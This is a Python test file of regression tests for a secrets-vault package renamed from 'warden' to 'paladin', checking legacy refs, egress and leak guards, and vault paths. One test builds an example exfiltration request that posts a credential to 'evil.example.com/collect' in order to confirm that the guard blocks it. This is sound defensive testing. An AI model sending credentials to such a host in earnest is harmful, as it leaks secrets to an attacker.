"""Pre-rename compatibility: the package is `paladin`, but data minted as
`warden` is still in circulation and must keep working.

These are regression tests for the rename itself. Every case here failed at
some point during `refactor/warden-to-paladin`, when a case-preserving
find-and-replace rewrote a *data format* as though it were an identifier. The
dangerous ones are the guards: they recognize a secret by its ref scheme, so a
ref they no longer match reads as "no secret here" and the request is allowed.
A rename that silently unrestricts every previously-issued credential is worse
than one that fails to build.

The line drawn during the rename, and the reason this file exists at all:
**silent failures get a compatibility shim; loud ones don't.** The `warden`
console script was allowed to disappear -- "command not found" tells the
operator exactly what happened. A vault resolving to an empty directory, or a
guard quietly declining to guard, tells them nothing.
"""
import os

import pytest

from custodian.adapters.builtin import EgressDomainGuard, SecretLeakGuard
from custodian.adapters.builtin._paths import looks_like_path
from custodian.adapters.builtin.kernel_self_protection import _default_protected
from custodian.adapters.base import ActionContext
from custodian.adapters.pipeline import AdapterPipeline
from paladin import vault as vault_mod
from paladin.refs import LEGACY_SCHEME, SCHEME, SecretRef, find_refs
from paladin.vault import Vault

PP = "test-passphrase"


def ctx(skill, args=None, **kw):
    return ActionContext(skill=skill, args=args or {}, **kw)


# -- refs --------------------------------------------------------------------

def test_legacy_scheme_parses():
    assert SecretRef.parse("warden://stripe_sk").name == "stripe_sk"


def test_current_scheme_parses():
    assert SecretRef.parse("paladin://stripe_sk").name == "stripe_sk"


def test_find_refs_finds_legacy_and_current():
    found = {r.name for r in find_refs(
        "a=paladin://new_sk b=warden://old_sk"
    )}
    assert found == {"new_sk", "old_sk"}


def test_refs_are_emitted_only_under_the_current_scheme():
    """Legacy is read-only: parsing one must not round-trip it back out."""
    assert SecretRef.parse("warden://stripe_sk").uri == "paladin://stripe_sk"
    assert SCHEME == "paladin://" and LEGACY_SCHEME == "warden://"


# -- egress-domain-guard: the fail-open ---------------------------------------

def test_egress_guard_blocks_disallowed_host_for_legacy_ref():
    """The regression that motivated all of this.

    The guard fires only when args carry BOTH a secret ref AND a
    non-approved host. Match the ref under one scheme only, and a legacy
    ref means no ref detected, means no trigger, means ALLOWED -- a
    host-restricted credential posted anywhere, reported as fine.
    """
    g = EgressDomainGuard({"ref_hosts": {"stripe_sk": ["api.stripe.com"]}})
    r = AdapterPipeline([g]).run_pre(ctx("http-post", {
        "url": "https://evil.example.com/collect",
        "headers": "Authorization: Bearer warden://stripe_sk",
    }))
    assert not r.allowed
    assert "evil.example.com" in r.denials[0].reason


def test_egress_guard_allows_approved_host_for_legacy_ref():
    g = EgressDomainGuard({"ref_hosts": {"stripe_sk": ["api.stripe.com"]}})
    assert AdapterPipeline([g]).run_pre(ctx("http-post", {
        "url": "https://api.stripe.com/v1/charges",
        "headers": "Authorization: Bearer warden://stripe_sk",
    })).allowed


def test_legacy_ref_is_not_mistaken_for_a_destination_host():
    """urlparse("warden://stripe_sk").hostname is "stripe_sk".

    Skip only the current scheme in _hosts_in and the secret's own *name*
    enters the destination set, and a denial names a host that was never a
    host. Asserted against _hosts_in directly and not through the pipeline:
    end-to-end, an unfixed guard still *allows* this call -- because it fails
    to see the ref at all -- so a verdict assertion would pass against the
    bug it is meant to catch.
    """
    from custodian.adapters.builtin.egress_domain_guard import _hosts_in
    hosts = _hosts_in("Authorization: Bearer warden://stripe_sk")
    assert "stripe_sk" not in hosts
    assert hosts == set()


# -- secret-leak-guard --------------------------------------------------------

def test_egress_guard_scheme_list_matches_paladin_refs():
    """The guard re-declares the scheme list rather than importing it, to keep
    `custodian` from importing `paladin`. This is the seam that keeps the two
    copies honest -- add a scheme in one place and this fails."""
    from custodian.adapters.builtin.egress_domain_guard import _REF_SCHEMES
    from paladin.refs import SCHEMES
    assert set(_REF_SCHEMES) == {s.removesuffix("://") for s in SCHEMES}


def test_legacy_ref_is_not_flagged_as_a_leaked_secret():
    """A ref is a zero-value pointer. Losing the exemption turns every
    previously-issued ref into a 'leaked credential' and denies it."""
    long_name = "a" * 40
    g = SecretLeakGuard({})
    assert AdapterPipeline([g]).run_pre(
        ctx("http-post", {"headers": f"Bearer warden://{long_name}"})
    ).allowed


# -- path helpers -------------------------------------------------------------

def test_legacy_ref_is_not_a_filesystem_path():
    assert not looks_like_path("warden://stripe_sk")
    assert not looks_like_path("paladin://stripe_sk")


# -- kernel-self-protection ---------------------------------------------------

def test_both_vault_homes_are_protected():
    """Vault.default_path() still resolves to ~/.warden when that is the only
    vault on disk. Protect only the new path and the guard defends an empty
    directory while the real vault sits unprotected beside it."""
    home = os.path.expanduser("~")
    protected = _default_protected()
    assert os.path.join(home, ".paladin") in protected
    assert os.path.join(home, ".warden") in protected


# -- vault: env vars ----------------------------------------------------------

def test_legacy_home_env_is_honored(tmp_path, monkeypatch):
    monkeypatch.delenv("PALADIN_HOME", raising=False)
    monkeypatch.setenv("WARDEN_HOME", str(tmp_path))
    assert vault_mod.default_vault_dir() == tmp_path


def test_current_home_env_wins_over_legacy(tmp_path, monkeypatch):
    monkeypatch.setenv("PALADIN_HOME", str(tmp_path / "new"))
    monkeypatch.setenv("WARDEN_HOME", str(tmp_path / "old"))
    assert vault_mod.default_vault_dir() == tmp_path / "new"


def test_empty_current_env_shadows_legacy_rather_than_promoting_it(monkeypatch):
    """`PALADIN_HOME= paladin ...` means "explicitly nothing", not "unset"."""
    monkeypatch.setenv("PALADIN_HOME", "")
    monkeypatch.setenv("WARDEN_HOME", "/should/not/win")
    assert vault_mod._env("PALADIN_HOME", "WARDEN_HOME") == ""


def test_legacy_passphrase_env_still_unlocks(tmp_path, monkeypatch):
    path = tmp_path / "v.paladin"
    Vault.create(path=path, passphrase=PP).save()
    monkeypatch.delenv("PALADIN_PASSPHRASE", raising=False)
    monkeypatch.delenv("PALADIN_KEYFILE", raising=False)
    monkeypatch.delenv("WARDEN_KEYFILE", raising=False)
    monkeypatch.setenv("WARDEN_PASSPHRASE", PP)
    assert Vault.open_from_env(path=path) is not None


# -- vault: on-disk layout ----------------------------------------------------

def test_legacy_vault_filename_is_found(tmp_path, monkeypatch):
    """An existing vault.warden must keep opening. The alternative is an
    operator staring at a fresh empty vault while their real credentials sit
    on disk, invisible -- the worst failure available to a credential tool."""
    monkeypatch.setenv("PALADIN_HOME", str(tmp_path))
    (tmp_path / "vault.warden").write_bytes(b"x")
    assert Vault.default_path() == tmp_path / "vault.warden"


def test_current_vault_filename_wins_when_both_exist(tmp_path, monkeypatch):
    monkeypatch.setenv("PALADIN_HOME", str(tmp_path))
    (tmp_path / "vault.warden").write_bytes(b"x")
    (tmp_path / "vault.paladin").write_bytes(b"x")
    assert Vault.default_path() == tmp_path / "vault.paladin"


def test_fresh_install_gets_the_current_filename(tmp_path, monkeypatch):
    monkeypatch.setenv("PALADIN_HOME", str(tmp_path))
    assert Vault.default_path() == tmp_path / "vault.paladin"
